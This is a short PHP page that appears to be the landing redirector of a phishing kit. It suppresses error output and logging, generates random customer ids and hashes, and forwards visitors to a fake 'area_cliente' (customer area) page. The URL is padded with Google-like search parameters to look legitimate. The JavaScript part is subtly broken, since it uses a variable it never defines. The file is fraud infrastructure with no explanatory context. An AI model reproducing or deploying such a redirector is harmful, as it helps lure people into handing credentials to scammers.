<?php
error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
@ini_set('html_errors','0');
@ini_set('display_errors','0');
@ini_set('display_startup_errors','0');
@ini_set('log_errors','0');
$mdr = md5(md5(md5(md5(uniqid(time())))));
$randy=rand(10000,99999);
$locoloco="area_cliente/index.php?customerid=".$randy."&defaults=webhelp?srcid=navigation-now&ion=1&espv=2&ie=UTF-8#".$mdr;
?>
<html><head>
<meta HTTP-Equiv="refresh" content="0; URL=<?echo $locoloco; ?>">
<script type="text/javascript">
loc = "<?echo $locoloco; ?>"
self.location.replace(locoloco);
window.location = locoloco;
</script>
</head></html>